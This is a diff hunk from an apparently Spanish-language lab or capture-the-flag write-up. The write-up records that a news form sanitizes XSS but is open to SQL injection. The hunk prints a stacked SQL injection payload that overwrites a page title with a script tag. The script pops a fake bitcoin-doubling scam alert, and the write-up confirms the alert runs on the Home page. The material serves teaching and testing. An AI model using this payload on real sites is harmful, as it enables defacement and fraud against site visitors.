@@ -12,12 +12,12 @@ Se prueba hacer un XSS directo en ese Form, pero la página que muestra las noti
    tiene los datos sanitizados. Sin embargo sí, se puede realizar un SQL Injection.
    
 4. El SQL Injection que realizamos es el siguiente:
-``');update title set text="
+`');update title set text="
 <script>
 alert('Felicitaciones! Como festejo del día de la primavera,
 la wiki empresarial está devolviendo los favores a sus empleados.
 Deposite aquí cualquier cantidad de bitcoins y se le devolverá el doble:
 wallet-56712345987')
 </script>
-" where id=1;--``. Luego vamos a la pestaña Home y vemos
+" where id=1;--`. Luego vamos a la pestaña Home y vemos
    que se ejecuta el alert().
